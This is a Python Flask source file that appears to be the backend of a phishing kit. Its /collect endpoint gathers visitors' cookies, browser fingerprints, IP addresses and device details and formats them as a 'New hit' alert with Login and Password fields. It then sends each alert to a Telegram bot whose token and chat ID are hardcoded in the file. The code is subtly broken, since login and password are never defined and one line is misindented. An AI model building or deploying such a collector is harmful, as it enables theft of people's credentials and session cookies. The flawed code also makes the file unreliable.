# language: Python, file: main.py
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import requests
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8740001087:AAHh4ULCEovFIToZ1oK2gzaEV7599gHxpno")
CHAT_ID   = os.getenv("CHAT_ID", "8784493975")

def send_to_tg(text: str):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    try:
        requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=8)
    except:
        pass

@app.route("/collect", methods=["POST"])
def collect():
    data = request.get_json(force=True, silent=True) or {}
    
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    
    ua = request.headers.get("User-Agent", "—")
    ref = request.headers.get("Referer", "—")
    
    screen   = data.get("screen", "—")
    lang     = data.get("lang", "—")
    tz       = data.get("tz", "—")
    platform = data.get("platform", "—")
    cookies  = data.get("cookies", "—")
    fp       = data.get("fp", "—")
    page     = data.get("url", "—")
    
    now = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    
   msg = f"""🚨 <b>New hit</b>
⏰ {now}
🔑 <b>Login:</b> <code>{login}</code>
🔒 <b>Password:</b> <code>{password}</code>
🌐 <b>IP:</b> <code>{ip}</code>
📱 <b>UA:</b> <code>{ua[:200]}</code>
🖥 <b>Screen:</b> {screen}
🗣 <b>Lang:</b> {lang}
🕒 <b>TZ:</b> {tz}
💻 <b>Platform:</b> {platform}
🔗 <b>Page:</b> {page}
📎 <b>Referer:</b> {ref}
🍪 <b>Cookies:</b> <code>{str(cookies)[:250]}</code>
🧬 <b>FP:</b> <code>{fp}</code>"""
    
    send_to_tg(msg)
    return jsonify({"ok": True})

@app.route("/")
def index():
    return send_from_directory(".", "index.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)
